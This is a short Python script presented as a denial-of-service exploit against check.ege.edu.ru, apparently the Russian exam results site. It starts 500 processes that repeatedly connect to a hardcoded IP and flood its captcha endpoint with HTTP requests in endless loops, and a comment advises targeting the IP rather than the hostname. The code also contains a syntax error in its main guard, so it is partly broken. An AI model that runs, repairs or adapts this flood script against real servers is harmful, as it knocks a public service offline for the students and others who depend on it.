'''
dos exploit for check.ege.edu.ru
'''

import socket
import multiprocessing
#If you want you can delete User-Agent and another headers

payload = b'GET /api/captcha HTTP/1.1\r\n\
Host: check.ege.edu.ru\r\n\
User-Agent: Mozilla/5.0 (Windows NT 10.0;) Gecko/20100101 Firefox/67.0\r\n\
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n\
Connection: keep-alive\r\n\
Cookie: _ga=GA1.3.1464828177.1559906581; _gid=GA1.3.1262355183.1560170249\r\n\
Upgrade-Insecure-Requests: 1\r\n\
Cache-Control: max-age=10000000000\r\n\r\n'

print("Her vam a ne resultati")

def dos():#Pretty simple dos
    global payload
    while True:
        try_ = True
        while try_:
            sock = socket.socket()
            sock.settimeout(0.4)
            try:
                sock.connect(('85.143.100.34',80))#May be different IP, must be checked
                                                  #DON`T USE HOSTNAME ONLY IP!!!!!!!!!!
                try_ = False
            except:
                sock.close()
                try_ = True
        while True:
            try:
                sock.send(payload)
            except:
                sock.close()
                break


if __name__ = '__main__':
    t = []
    n = 500
    for i in range(n):
            t.append(multiprocessing.Process(target = dos))

    for i in range(n):
            t[i].start()

    for i in range(n):
            t[i].join()
